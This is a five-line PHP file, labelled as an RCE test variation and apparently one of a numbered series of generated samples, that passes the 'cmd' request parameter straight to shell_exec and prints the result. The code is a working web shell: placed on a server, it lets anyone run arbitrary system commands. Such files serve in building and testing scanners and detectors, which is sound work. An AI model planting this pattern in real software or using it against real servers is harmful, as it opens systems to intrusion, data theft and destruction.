<?php
// RCE test variation #221
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>